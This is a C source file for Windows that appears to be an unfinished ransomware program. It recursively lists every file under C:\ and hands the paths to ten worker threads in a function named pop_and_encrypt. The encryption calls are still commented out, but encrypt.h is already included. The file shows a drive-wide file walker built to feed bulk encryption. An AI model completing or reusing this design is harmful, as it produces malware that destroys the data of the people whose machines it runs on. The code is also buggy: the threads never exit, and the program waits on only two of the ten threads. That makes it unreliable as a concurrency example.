#include <stdio.h>
#include <windows.h>
#include <assert.h>
#include <time.h>
#include "stack.h"
#include "file_utils.h"
#include "encrypt.h"
#include "sync.h"

size_t counter = 0;

void free_str(void *element) {
    free(element);
}

DWORD WINAPI pop_and_encrypt(LPVOID param) {
    struct Stack *stack = (struct Stack*)param;
    while(true) {    
        wait_sem();
        lock_mutex();
        wchar_t *file_path = (wchar_t*)stack_pop(stack);
        ++counter;
        unlock_mutex();
        printf("counter = %zu\n", counter);
        // work on it
        //printf("Thread %lu traite le fichier: %ls\n", GetCurrentThreadId(), file_path);
    }
    return 0;
}

int main(void) {
    init_sem();
    init_mutex();

    struct Stack *files_stack = stack_init();
    struct Stack *folders_stack = stack_init();

    /* THREADS */
    const int n = 10;
    HANDLE threads[10];
    for(int i = 0; i < n; ++i) {
        threads[i] = CreateThread(
            NULL,
            0,
            pop_and_encrypt,
            (LPVOID)files_stack,
            0,
            NULL
        );
    }
    /* THREADS */

    wchar_t root[] =  L"C:\\";
    wchar_t *folder_path;

    assert(stack_is_empty(files_stack));
    assert(stack_is_empty(folders_stack));

    time_t start, end;

    start = time(NULL);
    do {
        if(stack_is_empty(folders_stack)) {
            if((folder_path = _wcsdup(root)) == NULL) {
                fprintf(stderr, "[ERROR] FOLDERPATH _WCSDUP\n");
                return 1;
            }
        } else {
            folder_path = (wchar_t*)stack_pop(folders_stack);
        }

        populate_stacks_from_directory(folder_path, folders_stack, files_stack);
        free(folder_path);
    } while(!stack_is_empty(folders_stack));
    end = time(NULL);
    printf("done (files: %zu)\n", files_stack->size);
    printf("Temps écoulé : %lld secondes\n", end - start);

    WaitForMultipleObjects(2, threads, TRUE, INFINITE);
    for(int i = 0; i < 2; ++i) {
        CloseHandle(threads[i]);
    }
    assert(stack_is_empty(folders_stack));
    
    stack_free(&folders_stack, free_str);
    //encrypt_stack(files_stack);
    stack_clear(files_stack, NULL);
    assert(stack_is_empty(files_stack));

    stack_free(&files_stack, free_str);
    cleanup_mutex();
    cleanup_sem();
    return 0;
}